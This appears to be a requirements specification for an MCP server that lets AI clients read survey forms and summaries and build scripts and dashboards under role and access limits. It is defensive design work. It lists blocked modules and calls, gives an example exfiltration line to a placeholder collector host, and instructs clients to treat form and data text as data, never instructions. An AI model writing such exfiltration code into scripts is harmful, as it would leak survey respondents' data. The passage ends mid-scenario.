# mcp-server Specification

## Purpose
An MCP server in the `api` through which an AI client such as Claude, signed in as a project member, reads the Kobo form and summaries of the submissions, and writes, tests and runs the scripts and builds the dashboards and widgets, with that member's role and within the data access the deployment and the project allow.

## Requirements

### Requirement: Available only when enabled
The MCP server SHALL exist only when the operator sets `TAMIZA_MCP_ENABLED` to `true`. Without it, `/mcp` and the protected resource metadata SHALL answer 404, the connect page and the project setting SHALL not be shown, and the system configuration SHALL report the server as disabled. Enabling it SHALL NOT make any project accessible: each project stays off until its admin turns it on. The server SHALL make no outbound request and call no model.

#### Scenario: Not enabled
- **WHEN** a deployment has no `TAMIZA_MCP_*` variables and a client sends a request to `<public URL>/mcp`
- **THEN** the answer is 404, and `GET /api/v1/system/config` reports `mcp.enabled` as `false`

#### Scenario: Enabled
- **WHEN** the operator sets `TAMIZA_MCP_ENABLED=true` and restarts the `api`
- **THEN** `/mcp` asks unauthenticated clients to sign in, and every existing project is off for AI clients

#### Scenario: Malformed setting
- **WHEN** the operator sets `TAMIZA_MCP_MAX_DATA_ACCESS=everything`
- **THEN** the `api` does not start and its log names the variable and the values it accepts

### Requirement: Signing in through the identity provider
The MCP server SHALL be an OAuth protected resource of the configured Keycloak realm. A request without a valid token SHALL be answered 401 with a `WWW-Authenticate` header that points to the server's protected resource metadata, and that metadata SHALL name the MCP address exactly as clients enter it, the realm as the only authorization server, and the scopes a client requests. Clients SHALL sign people in with the authorization code flow with PKCE through a public client that the operator registers in the realm; Tamiza SHALL NOT issue, store or relay tokens of its own.

#### Scenario: First request of a client
- **WHEN** Claude sends its first request to `https://tamiza.example.org/mcp` without a token
- **THEN** the answer is 401 with `WWW-Authenticate: Bearer resource_metadata="https://tamiza.example.org/.well-known/oauth-protected-resource/mcp"`, and that document gives `resource` `https://tamiza.example.org/mcp` and the realm's issuer as its authorization server

#### Scenario: Person signs in
- **WHEN** an analyst connects Claude and signs in on the Keycloak page with their own account
- **THEN** Claude's later calls act as that analyst

### Requirement: Tokens for AI clients
The MCP server SHALL accept only tokens of the configured realm, signed, current and issued for the MCP audience (`TAMIZA_MCP_AUDIENCE`). The REST API under `/api/v1` SHALL refuse tokens issued only for the MCP audience, and the MCP server SHALL refuse tokens issued only for the API audience. A token without a subject SHALL be refused. The person a token names SHALL be provisioned and refreshed as for the UI, so the same Keycloak account is the same Tamiza user in both.

#### Scenario: Token of the UI
- **WHEN** a client sends to `/mcp` an access token that the UI client obtained for the audience `tamiza-api`
- **THEN** the answer is 401 and no tool runs

#### Scenario: Token of an AI client used on the REST API
- **WHEN** a request to `GET /api/v1/projects` carries a token issued for the audience `tamiza-mcp` only
- **THEN** the answer is 401

#### Scenario: Expired token
- **WHEN** a client calls a tool with an expired token
- **THEN** the answer is 401 with the same `WWW-Authenticate` header, so the client can refresh the token and call again

### Requirement: Calls act as the signed-in person
Every tool SHALL act as the person the token names, with that person's role in the project the call names, and SHALL require at least the role that the REST endpoint for the same operation requires. A person who is not a member SHALL get the answer given for a project that does not exist; a member whose role is too low SHALL be refused with a message naming the role needed. A superadmin SHALL act as `admin` on every project. Changes made through a tool SHALL be attributed to that person, as if they had made them in the UI.

#### Scenario: Viewer reads a dashboard
- **WHEN** a `viewer` of a project whose access is *Summaries only* asks Claude what the dashboard "Water" shows
- **THEN** `get_widget_data` returns the values of its widgets

#### Scenario: Viewer tries to save a script
- **WHEN** a `viewer` calls `save_script` on that project
- **THEN** the tool is refused with the code `mcp.forbidden`, saying that it needs the analyst role, and no version is created

#### Scenario: Not a member
- **WHEN** a person calls `get_form` with the identifier of a project they do not belong to
- **THEN** the tool is refused with the code `mcp.projectNotFound`, as for a project that does not exist

#### Scenario: Author of a widget
- **WHEN** an analyst's Claude creates a widget
- **THEN** the widget's author and last editor are that analyst

### Requirement: Data access levels
Each project SHALL have an access level for AI clients: `off`, `aggregates` (*Summaries only*) or `rows` (*Summaries and rows*), set by its admin (see `projects`), and the deployment SHALL have a maximum, `TAMIZA_MCP_MAX_DATA_ACCESS`, `aggregates` unless the operator sets `rows`. The level a call gets SHALL be the lower of the two. With `off`, every tool that names the project SHALL be refused with the code `mcp.projectOff`, saying that an admin can allow it in Settings > General. With `aggregates`, a tool or part of a result that needs rows SHALL be refused with the code `mcp.rowsNotAllowed` or left out, and the result SHALL say what was left out and why.

#### Scenario: Project off
- **WHEN** an analyst's Claude calls `get_tables` on a project whose access is off
- **THEN** the tool is refused with `mcp.projectOff` and reads no table

#### Scenario: Deployment maximum lower than the project
- **WHEN** a project's access is *Summaries and rows* and the operator sets the deployment's maximum to `aggregates`
- **THEN** calls on that project get *Summaries only*, and `query_rows` is refused with `mcp.rowsNotAllowed`

#### Scenario: Rows allowed
- **WHEN** both the deployment and the project allow rows
- **THEN** `query_rows` returns rows of the project's clean tables

### Requirement: What summaries hold
At *Summaries only*, results SHALL hold only: the project's name, form name, time zone and settings that the person's role can read; the form's questions, groups, repeats and choice lists with their names, codes and labels; the form versions in use with their submission counts; the tables of every source with their columns, types, question labels and row counts; column profiles (see "Column profiles"); the scripts' code and versions, the indicators' metadata and the dashboards' and widgets' configuration; the status, timing, row counts and table shapes of runs and tests, with their errors and log lines masked as the script assistant masks them; the field metrics of the performance dashboard; and the values that indicator queries and widgets return.

#### Scenario: Form and choices
- **WHEN** Claude calls `get_form` on a project whose form asks `water_source` with the choice list `sources`
- **THEN** the result holds the question with its type, label and list, and the codes and labels of `sources`

#### Scenario: Widget values
- **WHEN** Claude calls `get_widget_data` for a bar chart of the indicator `piped_water_rate` grouped by municipality
- **THEN** the result holds each municipality with its value, formatted as the dashboard formats it

### Requirement: Data that needs rows
At *Summaries only*, no result SHALL hold a row of a raw, clean, output, indicator or reference table, a row of a test preview, a value or table that a script passed to `ctx.show`, a log line without a log level, or an error or log text unmasked. A test or run result SHALL then hold the shape of each table and the masked error and log lines instead, and say that previews need *Summaries and rows*.

#### Scenario: Test preview withheld
- **WHEN** a test of script 1 succeeds at *Summaries only* and its step produced `main` with 480 rows
- **THEN** `get_test` returns `main` with 480 rows and its columns and types, no row, and a note that previews need *Summaries and rows*

#### Scenario: Masked error
- **WHEN** a draft fails with `KeyError: 'Juan Pérez'` at *Summaries only*
- **THEN** the result says `KeyError: '…'` with the script's line

#### Scenario: Test preview with rows allowed
- **WHEN** the same test runs at *Summaries and rows*
- **THEN** `get_test` returns the first 20 rows of `main`, or up to 100 when the call asks for them, and the values passed to `ctx.show`

### Requirement: Column profiles
`profile_table` SHALL describe up to 40 columns of one published table per call, computed over every row of the table as last published, and SHALL give for every column its type, the number of rows, empty values and distinct values. For integers and decimals it SHALL also give the minimum, the quartiles, the maximum and the mean; for dates and timestamps the earliest and latest; for true/false columns the count of each value. For a column that holds the answers of a select question it SHALL give the count of each label found, splitting the answers of a select_multiple question on `"; "`, and SHALL report counts below 5 as "fewer than 5". For any other text column with at most 50 distinct values, it SHALL give the values that 5 or more rows share with their counts, and fold the others into one count of values and rows. Other text columns SHALL get no values. A table with more than 40 columns SHALL be profiled for the first 40 unless the call names the columns, and the result SHALL list the names of the others.

#### Scenario: Select question
- **WHEN** Claude profiles `main`, where `water_source` holds "Piped" in 812 rows, "Well" in 390 and "River" in 2
- **THEN** the profile gives "Piped" 812, "Well" 390 and "River" fewer than 5

#### Scenario: Free text
- **WHEN** Claude profiles the column `respondent_name`, a text column with 1,180 distinct values
- **THEN** the profile gives its rows, empty values and distinct values, and no name

#### Scenario: Short list
- **WHEN** a clean column `age_group` holds "18-29" in 300 rows, "30-59" in 700 and "60+" in 3
- **THEN** the profile gives "18-29" 300 and "30-59" 700, and one other value in 3 rows

#### Scenario: Numbers with a sentinel
- **WHEN** the column `household_size` holds values from 1 to 14 and `-99` in 6 rows
- **THEN** the profile gives a minimum of -99, which shows the sentinel to clean

#### Scenario: Wide table
- **WHEN** Claude profiles a table with 210 columns without naming any
- **THEN** the profile covers the first 40 and lists the names of the other 170

### Requirement: Tools and their roles
The MCP server SHALL offer these tools, each requiring the role given and acting on one project unless it says otherwise:

| Tool | Role | What it does |
|---|---|---|
| `list_projects` | any member | The person's projects, with their role and the effective access level of each |
| `get_project` | viewer | Name, form, time zone, submissions stored and last received, last synchronization, published tables, scripts and indicators (analyst), dashboards, last run |
| `get_form` | analyst | Questions, groups, repeats, choice lists, form versions in use, enumerator question, field check |
| `get_tables` | viewer (clean, output, indicators), analyst (raw, reference) | Tables of a source with columns, types, question labels, select lists and row counts |
| `profile_table` | as `get_tables` | Column profiles of one table |
| `get_fieldwork` | viewer | The performance dashboard's metrics for an optional range of days |
| `query_rows` | as `get_tables`; rows level | Rows of one table with the clean data dashboard's filters and sort, at most 100 per call |
| `get_authoring_guide` | analyst of a project whose access is not off | The script contract, the `ctx` members, the libraries and the templates of a kind |
| `list_scripts`, `get_script`, `list_script_versions` | analyst | Scripts, their current versions with author, time and origin, and any version's code |
| `save_script`, `remove_script`, `restore_script_version` | analyst | Save, remove or restore a script as a new version |
| `test_script`, `get_test` | analyst | Start a sample test of a draft and read it |
| `start_run`, `get_run` | analyst | Queue a run and read the latest or a given run |
| `list_indicators`, `get_indicator_columns`, `query_indicator` | viewer | Indicators with their metadata and publish state, their columns and roles, and what a widget query returns |
| `list_dashboards`, `get_dashboard`, `get_widget_data` | viewer | Dashboards in order, one dashboard's filters, palette, colors kept by value, widgets and current version, and what its widgets show |
| `create_dashboard`, `update_dashboard`, `duplicate_dashboard`, `remove_dashboard` | analyst | Add, rename, move, change the filters and the colors (palette and colors kept by value) of, duplicate and remove dashboards |
| `create_widget`, `update_widget`, `remove_widget` | analyst | Add, change (a widget's color or scale included), move to another dashboard and remove widgets |
| `list_dashboard_versions`, `get_dashboard_version` | analyst | A dashboard's kept versions with what changed, author, time and origin, and any kept version's name, filters, palette, colors kept by value and widgets |
| `restore_dashboard_version` | analyst | Restore a kept version of a dashboard as a new version |

Each tool SHALL describe its arguments with a JSON schema and SHALL be marked as read-only, or as changing or removing data, so clients can ask the person before running it.

#### Scenario: Tool list
- **WHEN** a signed-in client lists the tools
- **THEN** it receives the tools of the table, `query_rows` among them, each with its schema and annotations

#### Scenario: Removal marked
- **WHEN** a client reads the annotations of `remove_dashboard`
- **THEN** the tool is marked as destructive, and `get_dashboard` as read-only

#### Scenario: Restore marked
- **WHEN** a client reads the annotations of `restore_dashboard_version`
- **THEN** the tool is marked as changing data and not as destructive, and `list_dashboard_versions` and `get_dashboard_version` as read-only

### Requirement: Same rules as the UI
A tool that changes something SHALL apply the same validation, limits and checks as the REST endpoint for the same operation, and SHALL report a refused value with the field and the message that endpoint gives. Two members, or a member and their own AI client, changing the same thing at once SHALL be handled as for two members in the UI.

#### Scenario: Dashboard limit
- **WHEN** Claude calls `create_dashboard` on a project that has 10 dashboards
- **THEN** the tool is refused with the code `dashboards.limit` and nothing is added

#### Scenario: Dashboard limit described
- **WHEN** an AI client lists the tools of the server
- **THEN** the descriptions of `list_dashboards`, `create_dashboard` and `duplicate_dashboard` say a project has at most 10 dashboards

#### Scenario: Group column required
- **WHEN** Claude calls `create_widget` for a bar chart without a column to group by
- **THEN** the tool is refused naming the field `config.groupBy` with the endpoint's message

### Requirement: Saving scripts against the current version
`save_script`, `remove_script` and `restore_script_version` SHALL require the number of the version the client read as the current one, or none for a script that has no current version. When the current version is another, the tool SHALL change nothing and be refused with the code `mcp.scriptChanged`, giving the current version's number, author and time. A version created through MCP SHALL record its origin as MCP, besides its author.

#### Scenario: Member saved meanwhile
- **WHEN** Claude read version 4 of the indicator `coverage`, an analyst saves version 5 in the editor, and Claude then calls `save_script` with version 4
- **THEN** the tool is refused with `mcp.scriptChanged` naming version 5, and no version is created

#### Scenario: New indicator
- **WHEN** Claude calls `save_script` for a new indicator `school_attendance` with its label, unit and format and no version
- **THEN** version 1 of `school_attendance` is created, attributed to the analyst and marked as saved via MCP

### Requirement: Removing needs the name
`remove_dashboard` and `remove_widget` SHALL require, besides the identifier, the current name of the dashboard or the current title of the widget, compared ignoring case and surrounding spaces. When it does not match, the tool SHALL remove nothing and be refused with the code `mcp.nameMismatch`, giving the current name. A removed dashboard cannot be brought back. A removed widget can, while a kept version of its dashboard holds it: it can be added again from that version, or brought back by restoring that version, which also undoes the changes made since. A removed script keeps its versions and can be restored, and `remove_script` is guarded by the current version instead (see "Saving scripts against the current version").

#### Scenario: Wrong dashboard
- **WHEN** Claude calls `remove_dashboard` with the identifier of "Health" and the name "Field"
- **THEN** the tool is refused with `mcp.nameMismatch` naming "Health", and the dashboard is kept

#### Scenario: Widget removal undone
- **WHEN** Claude removes the widget "Water source" from "Housing", making version 8, and then restores version 7
- **THEN** "Housing" holds "Water source" again

### Requirement: Code that reaches outside the script
Because scripts run without a strong sandbox and an AI client can be misled by text in the form or the data, `save_script`, `restore_script_version` and `test_script` SHALL refuse, with the code `mcp.unsafeCode` and the lines found, code that imports a module of the editor's list of modules scripts never need (such as `os`, `subprocess` or `socket`), calls `__import__`, `eval`, `exec`, `compile` or `open`, or holds an `http://`, `https://` or `ftp://` address. The editor SHALL keep accepting such code from a person, with its warnings.

#### Scenario: Script that sends data away
- **WHEN** Claude calls `save_script` with code that holds `requests.post("https://collector.example/upload", …)` or `import socket`
- **THEN** the tool is refused with `mcp.unsafeCode` naming those lines, and no version is created

#### Scenario: Same code in the editor
- **WHEN** an analyst saves that code in the editor
- **THEN** it is saved, with the editor's import warning

### Requirement: Tests through MCP
`test_script` SHALL queue a sample test exactly as the editor does, with the same sample sizes, cell stops and queue rules, including that a new test replaces the same person's queued test in the project, and `get_test` SHALL read only that person's tests within their lifetime. The result SHALL give the status, what the test waits for, and, for each step, its status, duration, row counts and tables; for an indicator, the facts of its dashboard view with its warnings, totals and up to 50 groups per chart; and the error and log of the tested draft, masked at *Summaries only*.

#### Scenario: Test of a new indicator
- **WHEN** Claude calls `test_script` with a draft of the indicator `piped_water_rate` and waits
- **THEN** the result gives the steps, the table `piped_water_rate` with its columns and rows, the dashboard view's measures and dimensions, and a warning when a percent is above 1

#### Scenario: Test replaced
- **WHEN** an analyst's queued test in the editor has not started and their Claude starts another test in the same project
- **THEN** the editor's queued test is removed and Claude's test runs

### Requirement: Runs through MCP
`start_run` SHALL queue a run as **Run now** does, with the same rules for a run already queued or running, and `get_run` SHALL return the latest run or the one named, with its status, trigger, the script versions used, and for each step its status, duration, row counts and error, masked at *Summaries only*.

#### Scenario: Run after saving
- **WHEN** Claude saves two indicator scripts, calls `start_run` and waits
- **THEN** the result gives the run's steps, one per indicator, and the tables they published

### Requirement: Waiting inside a call
`test_script`, `get_test`, `start_run` and `get_run` SHALL accept a number of seconds to wait, from 0 to 120 and 50 by default, and SHALL answer as soon as the test or run ends or that time passes, whichever comes first. A result given before the end SHALL say that it is still queued or running and how to read it again. While waiting, the server SHALL send progress notifications when the client asked for them.

#### Scenario: Long run
- **WHEN** Claude calls `start_run` with the default wait and the run takes three minutes
- **THEN** the call returns after 50 seconds saying the run is running, and a later `get_run` with a wait returns its result

### Requirement: Indicator queries and widget data
`query_indicator` SHALL run a widget query (an indicator, a measure or a ratio, a column to group by, an optional series column, filters, and for histograms the ranges) without saving anything, and return what that widget would plot, formatted with the indicator's format and unit. `get_widget_data` SHALL return what one widget, or every widget of a dashboard, shows with the dashboard filters' default values or the values the call gives, including the message a widget shows when its indicator is not published or a column is gone. For a widget with a series, both SHALL return one value per pair of group and series value, the totals, the series in their order with "Other" when some were combined, and how many rows were left out. For a box plot, both SHALL return each box's group, number of values, minimum, first quartile, median, third quartile, maximum, mean, whisker ends and number of outliers, formatted, and SHALL NOT return a list of the outliers' values (a box's minimum and maximum are single figures, as a column profile's are). Both SHALL apply the row limit of widgets and say when it is reached.

Both SHALL also return, for each value of a widget with no series and for each total, its base n and, for a ratio, the sums of its numerator and denominator; for each cell of a widget with a series, its base n; the widget's base n when it has one; and, for a widget that leaves out no-data values, those values and what they held (see `dashboard-indicators`). `get_widget_data` SHALL also say which values have a small base under the threshold in force.

#### Scenario: Checking a widget before saving it
- **WHEN** Claude calls `query_indicator` for the ratio of `numerator` to `denominator` of `piped_water_rate` grouped by `municipality`
- **THEN** the result holds one value per municipality, formatted as a percent, and no widget is created

#### Scenario: Stale widget
- **WHEN** a widget groups by a column that its indicator no longer publishes
- **THEN** `get_widget_data` returns for it the message naming the missing column, and the other widgets' values

#### Scenario: Checking a stacked chart
- **WHEN** Claude calls `query_indicator` for `households_by_source` grouped by `municipality` with the series `water_source`
- **THEN** the result holds one value per municipality and water source, each municipality's and each water source's total, and the grand total

#### Scenario: Checking a box plot
- **WHEN** Claude calls `query_indicator` with the chart type box plot for `household_income` grouped by `municipality`
- **THEN** the result holds one box per municipality with its number of values, its five figures from minimum to maximum, its mean, its whisker ends and its number of outliers, and no list of its outliers

#### Scenario: Base figures of a widget
- **WHEN** Claude calls `get_widget_data` for "2.1. Asistió, por comuna" on "Teatro", whose small-base threshold is 30
- **THEN** each comuna has its value, numerator, denominator and n, and `COMUNA 7` and `SIN NOMBRE` are marked as small bases

#### Scenario: Measure without a base through MCP
- **WHEN** Claude calls `query_indicator` for the sum of `value` of `teatro_conteo`, which declares no base column
- **THEN** its rows hold no numerator, denominator or n

### Requirement: Dashboards and widgets through MCP
`create_dashboard`, `update_dashboard`, `duplicate_dashboard` and `remove_dashboard` SHALL add, rename, move to a position, change the filters of, change the colors of (palette and colors kept by value), duplicate and remove dashboards with the rules of the UI. `get_dashboard` SHALL return the dashboard's palette and colors kept by value. `create_widget` SHALL add a widget with a title, a chart type, a query and an optional position and size on the 12-column grid, placed under the dashboard's widgets when none is given; `update_widget` SHALL change any of them or move the widget to another dashboard. Both SHALL take every chart type and setting the widget form offers, including the series column, the layout of bars and columns, the sides of a population pyramid, the scale of a Likert widget, the order and the orientation of a box plot, and a widget's color and sequential scale, with the same validation. A dashboard's members SHALL see the change the next time their page reads the dashboard.

#### Scenario: Dashboard for a situation
- **WHEN** Claude creates the dashboard "Water access", adds a stat tile and a map of `piped_water_rate` without positions, and a dashboard filter on `municipality`
- **THEN** the dashboard has the filter and the two widgets one under the other, and a viewer who opens it sees them

#### Scenario: Move to a position
- **WHEN** Claude calls `update_dashboard` to move "Water access" to the first position while another member moves another dashboard
- **THEN** only one of the two moves is applied, and the other is refused as in the UI with `dashboards.orderChanged`

#### Scenario: Pyramid through MCP
- **WHEN** Claude calls `create_widget` for a population pyramid of `population` grouped by `age_band` with the series `sex`, `Female` on the left and `Male` on the right
- **THEN** the widget is saved and a member who opens the dashboard sees the pyramid

#### Scenario: Invalid Likert scale through MCP
- **WHEN** Claude calls `create_widget` for a Likert widget whose scale puts a positive value before a negative one
- **THEN** the call is refused with `mcp.validation` and the error on the scale, and nothing is saved

#### Scenario: Colors through MCP
- **WHEN** Claude calls `update_dashboard` on "Water access" with the palette `earth` and color 5 kept for `Female` of `sex`, then `create_widget` for a map with the green scale
- **THEN** a member who opens "Water access" sees its charts in the colors of *Earth*, `Female` in color 5, and the map on the green scale, and `get_dashboard` returns the palette and the color kept

#### Scenario: Unknown palette through MCP
- **WHEN** Claude calls `update_dashboard` with the palette `neon`
- **THEN** the call is refused with `mcp.validation` and the error on the palette, and nothing is saved

#### Scenario: Box plot through MCP
- **WHEN** Claude calls `create_widget` for a horizontal box plot of `household_income` grouped by `municipality`, ordered by median descending
- **THEN** the widget is saved and a member who opens the dashboard sees the horizontal boxes, the largest median first

#### Scenario: Box plot with a series through MCP
- **WHEN** Claude calls `create_widget` for a box plot with the series `sex`
- **THEN** the call is refused with `mcp.validation` and the error on the series column, and nothing is saved

### Requirement: Rows of a table
`query_rows` SHALL be available only at *Summaries and rows*. It SHALL return at most 100 rows of one table of a source the person's role can read, with chosen columns, the clean data dashboard's filters and one sort column, and the total of rows that match. Text longer than 500 characters SHALL be cut and marked as cut.

#### Scenario: Rows refused
- **WHEN** Claude calls `query_rows` at *Summaries only*
- **THEN** the tool is refused with `mcp.rowsNotAllowed`, saying that the project's admin and the operator decide it

#### Scenario: Filtered rows
- **WHEN** Claude asks at *Summaries and rows* for the rows of `main` where `water_source` is "River"
- **THEN** the result holds those rows, at most 100, and how many rows match

### Requirement: Size of results
A result SHALL hold at most 60,000 characters unless the operator sets another size between 10,000 and 140,000. A longer result SHALL be cut from the end of its longest list, and SHALL say what was left out and how to ask for less, such as naming columns or a page.

#### Scenario: Large form
- **WHEN** Claude calls `get_form` on a form whose questions and choice lists exceed the size
- **THEN** the result is cut, says how many choice lists were left out, and names the argument that reads one list

### Requirement: Limits per person
A person SHALL run at most 4 calls at once and at most 120 calls a minute across their clients, unless the operator sets other limits. A call over a limit SHALL be refused with the code `mcp.rateLimited` and the seconds to wait. Reading rows SHALL have the clean data dashboard's timeout, and a column profile a timeout of its own, 60 seconds unless the operator sets another; a read that passes its timeout SHALL be stopped and refused with a message that suggests naming fewer columns or a narrower filter.

#### Scenario: Burst of calls
- **WHEN** a client sends 130 calls in one minute for the same person
- **THEN** the last 10 are refused with `mcp.rateLimited` and the seconds to wait, and none of them runs

### Requirement: Call records
Each tool call SHALL be recorded with the person, the project when it names one, the tool, the access level the call got, the outcome (succeeded, failed or refused) with its code, the duration, the size of the result and when it started. A record SHALL hold no argument and no result. Records SHALL be deleted after 180 days and with their project.

#### Scenario: Script saved by Claude
- **WHEN** Claude saves a script for an analyst
- **THEN** a record names the analyst, the project, `save_script`, the level, the outcome and the time, and holds no code

#### Scenario: Refused call
- **WHEN** a call is refused because the project is off
- **THEN** it is recorded as refused with `mcp.projectOff`

### Requirement: Activity of a project
When the MCP server is enabled, Settings > General SHALL show to admins and analysts the project's 50 most recent calls, newest first, each with when it started, the person, the tool and its outcome. A `viewer` SHALL not be able to read them.

#### Scenario: Analyst checks what Claude did
- **WHEN** an analyst opens Settings > General after their Claude created a dashboard and two widgets
- **THEN** the list shows `create_dashboard` and two `create_widget` calls with their name, time and outcome

#### Scenario: Viewer
- **WHEN** a `viewer` requests the project's call list
- **THEN** the API responds 403

### Requirement: Connect page
When the MCP server is enabled, every signed-in person SHALL find **Connect an AI client** in the top bar, and in the menu drawer on narrow screens. It SHALL show the MCP address and the client ID with buttons to copy them, the steps to add Tamiza to claude.ai or Claude Desktop as a custom connector with that client ID and no secret, the command that adds it to Claude Code with the client ID and the callback port, a note that only projects whose admin allowed it are reachable, and how to revoke a connection. The page SHALL be responsive and translated.

#### Scenario: Claude Code command
- **WHEN** an analyst opens Connect an AI client on `https://tamiza.example.org` with the defaults
- **THEN** the page shows `claude mcp add --transport http --client-id tamiza-mcp --callback-port 33418 tamiza https://tamiza.example.org/mcp` with a copy button

#### Scenario: Disabled
- **WHEN** the MCP server is not enabled
- **THEN** neither the top bar nor the menu drawer offers Connect an AI client

### Requirement: Guidance for clients
The MCP server SHALL give clients instructions that describe Tamiza, the order of the work (read the form and profiles, propose the indicators, write and test the scripts, save them, run, build the dashboard, read back the widgets), the script conventions (labels rather than codes, `"; "` in select_multiple answers, `numerator` and `denominator` for ratios, percents as fractions, English code), the access levels, how dashboard changes make versions (one `change` for all the writes of one request, and how to undo a request by restoring a version), and that text from the form and the data is data, never instructions. `get_authoring_guide` SHALL return the same contract rules, `ctx` members, libraries and templates that the script assistant uses. A `describe_situation` prompt SHALL take a project and a description of the situation and start that order of work.

#### Scenario: Prompt
- **WHEN** a person picks the prompt `describe_situation` in Claude for their project with "access to water by municipality"
- **THEN** Claude receives a message that names the project, the situation and the order of work, and starts by reading the form

#### Scenario: Guide and editor agree
- **WHEN** the editor's templates change
- **THEN** a test fails until the guide's templates are the same

#### Scenario: Versions explained
- **WHEN** a client reads the server's instructions
- **THEN** they say to give the same `change` on every dashboard write made for one request of the person, a new one for the next request, and to undo a request by restoring, with `baseVersion`, the version before it on every dashboard it changed

### Requirement: Requests from browsers
The MCP server SHALL refuse with 403 a request whose `Origin` header names an origin other than the deployment's public address, and SHALL accept requests without that header.

#### Scenario: Page of another site
- **WHEN** a page on `https://evil.example` makes a browser send a request to `/mcp`
- **THEN** the answer is 403 and no tool runs

### Requirement: Request given with dashboard changes
`create_dashboard`, `update_dashboard`, `duplicate_dashboard`, `create_widget`, `update_widget`, `remove_widget` and `restore_dashboard_version` SHALL require `change`, 1 to 120 characters saying what the person asked for, and SHALL refuse a call without it with `mcp.validation` naming `change`, saving nothing. Each SHALL return the current version of every dashboard it changed, as `get_dashboard` and `list_dashboards` SHALL for each dashboard.

#### Scenario: Request missing
- **WHEN** Claude calls `create_widget` without `change`
- **THEN** the tool is refused with `mcp.validation` naming `change`, and no widget is added

#### Scenario: Version returned
- **WHEN** Claude calls `create_widget` on "Water access", whose current version is 4
- **THEN** the result gives the widget and version 5 of "Water access"

#### Scenario: Only the order changed
- **WHEN** Claude calls `update_dashboard` only to move "Water access" to the first position
- **THEN** the dashboard moves, no dashboard has a new version, and the result gives the current version of "Water access"

### Requirement: Calls refused after saving part
When a call that makes several changes is refused after part of it was saved, such as `update_dashboard` renaming a dashboard and then refusing its filters, what was saved SHALL be recorded in a version as for a call that succeeded.

#### Scenario: Part of a call refused
- **WHEN** Claude calls `update_dashboard` on "Water" with the name "Agua" and filters that are not valid
- **THEN** the call is refused for the filters, and "Agua" has a new version holding the new name with the filters it had

### Requirement: One version per request
Writes through MCP by one person on one dashboard with the same `change`, compared ignoring case and surrounding spaces, SHALL make one version of that dashboard, as long as each comes less than 30 minutes after the previous one and no other version of that dashboard is recorded between them. That version SHALL be marked as made through MCP, attributed to the person, and show the `change`. A restore SHALL always make a version of its own, which no later write joins.

#### Scenario: Five widgets, one version
- **WHEN** Claude calls `create_widget` five times on "Water access" with the `change` "Add five water indicators"
- **THEN** "Water access" has one new version, attributed to the analyst and marked "via MCP", that holds the five widgets and shows "Add five water indicators"

#### Scenario: New dashboard with its widgets
- **WHEN** Claude calls `create_dashboard` for "Water access" and then `create_widget` three times, all with the `change` "Build the water dashboard"
- **THEN** "Water access" has only version 1, holding the three widgets

#### Scenario: Two dashboards in one request
- **WHEN** Claude adds two widgets to "Water" and one to "Health" with the same `change`
- **THEN** "Water" and "Health" each have one new version

#### Scenario: Next request
- **WHEN** Claude then renames "Water" to "Agua" with the `change` "Rename Water to Agua"
- **THEN** "Agua" has another new version

#### Scenario: Member changes in between
- **WHEN** Claude adds two widgets to "Water" with the `change` "Add water widgets", the analyst then drags a widget of "Water" in the UI, and Claude adds a third widget with the same `change`
- **THEN** "Water" has three new versions: the two widgets, the drag, and the third widget

#### Scenario: Long pause
- **WHEN** Claude adds a widget to "Water" with the `change` "Add water widgets" and another with the same `change` 40 minutes later
- **THEN** "Water" has two new versions

#### Scenario: Calls at the same time
- **WHEN** Claude makes two `create_widget` calls on "Water" at the same time, both with the `change` "Add water widgets"
- **THEN** "Water" has one new version that holds both widgets and lists both as added

#### Scenario: Restore then edit in one request
- **WHEN** Claude restores version 7 of "Water" and then adds a widget, both with the `change` "Go back and add a pie chart"
- **THEN** "Water" has two new versions: the restore and the widget

### Requirement: Dashboard versions through MCP
`list_dashboard_versions` SHALL return a dashboard's kept versions, newest first, with what the version history shows for each and which one is current. `get_dashboard_version` SHALL return a kept version's name, filters, palette, colors kept by value and widgets with their settings, as `get_dashboard` returns them. `restore_dashboard_version` SHALL restore a kept version with the rules of the UI and its `change`, and return the new version, whether the name was kept, and the widgets restored as copies.

#### Scenario: Undoing a request
- **WHEN** an analyst asks Claude to undo its last request on "Water access", whose current version 9 was made by that request
- **THEN** Claude lists the versions, restores version 8, and "Water access" is as before the request, with version 10 marked "via MCP" saying version 8 was restored

#### Scenario: Undoing a request that moved a widget
- **WHEN** a request moved the widget "Coverage" from "Health" to "Field", and Claude then restores the version before it on "Field" and after that on "Health"
- **THEN** "Coverage" is back on "Health" with its identifier, and "Field" no longer holds it

#### Scenario: Comparing a version
- **WHEN** Claude calls `get_dashboard_version` for version 7 of "Housing", which held a widget since removed
- **THEN** the result holds that widget with its title, chart type, query, position and size, and nothing changes

#### Scenario: Viewer
- **WHEN** a `viewer` calls `list_dashboard_versions`
- **THEN** the tool is refused with `mcp.forbidden`, saying that it needs the analyst role

#### Scenario: Version no longer kept
- **WHEN** Claude calls `get_dashboard_version` for version 1 of a dashboard that keeps versions 2 to 11
- **THEN** the tool is refused with `dashboards.versionNotFound`

#### Scenario: Colors of a version
- **WHEN** Claude calls `update_dashboard` on "Water access" with the palette `earth` and color 5 kept for `Female` of `sex`, and then calls `get_dashboard_version` for the version before that change and for the version it made
- **THEN** the first holds the palette `tamiza` and no colors kept by value, and the second holds the palette `earth` and the color kept

### Requirement: Restoring dashboards against the current version
`restore_dashboard_version` SHALL require `baseVersion`, the number of the dashboard's current version as the client last read it. When the current version is another, the tool SHALL change nothing and be refused with the code `mcp.dashboardChanged`, giving the current version's number, author, time and origin.

#### Scenario: Member changed meanwhile
- **WHEN** Claude read version 12 of "Housing", an analyst then adds a widget in the UI, making version 13, and Claude calls `restore_dashboard_version` for version 9 with the base version 12
- **THEN** the tool is refused with `mcp.dashboardChanged` naming version 13 and that analyst, and "Housing" is unchanged

### Requirement: Indicator column labels through MCP
`save_script` SHALL take for an indicator an optional `columns`: an object from a column's name to its properties, here its `label`. Left out, the current version's labels SHALL be kept; given, it SHALL replace them all, and `{}` SHALL clear them, with the rules and errors of the indicator's details. `list_indicators`, `get_script` and `save_script`'s result SHALL return an indicator's column labels, and `get_indicator_columns` SHALL give each column the label its indicator gives it.

#### Scenario: Labels saved through MCP
- **WHEN** Claude calls `save_script` for `teatro_hoy` with `columns` = `{ "numerator": { "label": "Hogares que asistieron" }, "denominator": { "label": "Hogares" } }`
- **THEN** the new version has those labels, `get_script` returns them, and a member who opens "Teatro" sees them in its widgets

#### Scenario: Client that leaves the labels out
- **WHEN** an AI client that knows nothing of column labels calls `save_script` for `teatro_hoy` with new code, its label, unit and format
